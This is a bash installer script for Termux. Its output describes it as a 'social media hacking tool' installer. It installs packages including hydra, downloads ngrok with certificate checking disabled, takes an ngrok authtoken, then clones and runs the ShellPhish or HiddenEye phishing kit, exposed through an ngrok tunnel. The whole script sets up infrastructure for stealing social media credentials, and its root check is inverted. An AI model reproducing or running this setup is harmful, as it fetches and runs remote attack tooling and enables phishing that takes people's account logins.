#!/bin/bash

clear
echo -e "\e[1;4m I AM \e[0m "
figlet cYBER cRYPTO


echo -n -e " \e[38;41mEnter your name : \e[0m "
read NAME
echo " "
echo -e "Hey \e[31m${NAME^^} "
echo "  "
echo -e  " \e[34mI am here to help you with installing social media hacking tool👿👿 "
echo "  "
echo -e " \e[33mSit back and enjoy till i download the phishing tool for you🤗🤗 "
echo "   "
echo -e "\e[32mFor any issues contact me on whatsapp \e[1;4;35m+91 9313447013 ::\e[0m\n "

figlet BRIZZESH

echo -e "\e[3;96mDownloading basic packages for TERMUX "
cd
apt update -y
apt upgrade -y
apt install git -y
apt install cmatrix -y
apt install sl -y
apt install python -y
apt install python2 -y
apt install ruby -y
gem install lolcat
gem install bundler
apt install screenfetch -y
apt install cowsay -y
apt install toilet -y
apt install figlet -y
apt install php -y
apt install perl -y
apt install nmap -y
apt install hydra -y
pkg install openssh -y
apt install bash -y
apt install clang -y
apt install jq -y
apt install macchanger -y
apt install nano -y
apt install curl -y
apt install tar -y
apt install zip -y
apt install fish -y
apt install unzip -y
apt install tor -y
apt install wget -y
apt install unstable-repo -y
apt install x11-repo -y
apt install binutils -y
apt install ncurses-utils -y
apt install tsu -y
apt install termux-api -y
apt install tor -y
apt install w3m -y
apt install wcalc -y
apt install openssl -y
apt install openssl-tool -y
apt install bmon -y
apt-get upgrade -y


#############DOWNLOAD NGROK##############
echo -e "\e[3;96mDOWNLOADING NGROK \e[0m"
cd 
wget --no-check-certificate https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip 
unzip ngrok-2.2.8-linux-arm.zip

########CONFIGURE NGROK########

echo -e "               \e[101m\e[1;77m NOW WATCH THIS VIDEO \e[0m\n "
echo -e "           \e[1;4;38m https://youtu.be/fpIxx-D2qh4\e[0m\n "
echo -e "    \e[101m\e[1;77mGO TO ngrok.com AND CREATE YOUR FREE ACCOUNT \e[0m\n "
echo "  "
echo -e "\e[33mcopy the AUTHTOKEN and paste here 👇👇\e[0m "
echo "   "
echo "   "
echo -n " ENTER YOUR AUTHTOKEN HERE : "
read AUTH

cd
./ngrok authtoken $AUTH




########Downloading TOOLS ############


echo -e " \e[33m Checking ROOT permissions"

if (( $EUID == 0 )); then
echo -e "\e[101m\e[1;77m::You dont have ROOT....Downloading ShellPhish ::\e[0m\n"
cd
git clone https://github.com/Ethical-Hacking-Zone/shellphish
cp ngrok $HOME/shellphish
cd shellphish
chmod +x *
unzip sites.sh
bash shellphish.sh


else 
echo -e  "\e[101m\e[1;77m:: You have ROOT Permission....Downloading HiddenEye ::\e[0m\n"
cd
git clone https://github.com/DarkSecDevelopers/HiddenEye
cp ngrok $HOME/HiddenEye
cd HiddenEye
chmod +x *
pip install -r requirements.txt
cd && cp  ngrok $HOME/HiddenEye
cd HiddenEye
sudo python HiddenEye.py

fi


echo -e "\e[1;32m       .:.:.\e[0m\e[1;95m Thanks for using my script😍😍 \e[0m\e[1;32m.:.:.\e[0m\n "
echo "  "
echo -e "\e[1;32m       .:.:.\e[0m\e[1;95m The original tools belong to their respective owners. i have just made it easy to install it \e[0m\e[1;32m.:.:.\e[0m\n"
echo "   "
toilet Yours 
echo " "
echo " "
echo "             "
echo "                ######         "
echo "                #         "
echo "                #       #   # #### #### #####  "
echo "                #        # #  #  # #    #   #  "
echo "                #         #   #### #### #####  "
echo "                #         #   #  # #    # #    "
echo "  #######       #######   #   #### #### #  #   "
echo "  #                             "
echo "  #       ##### #   # ##### ####### ##### "
echo "  #       #   #  # #  #   #    #    #   #  "
echo "  #       #####   #   #####    #    #   # "
echo "  #       # #     #   #        #    #   # "
echo "  ####### #  #    #   #        #    #####  "
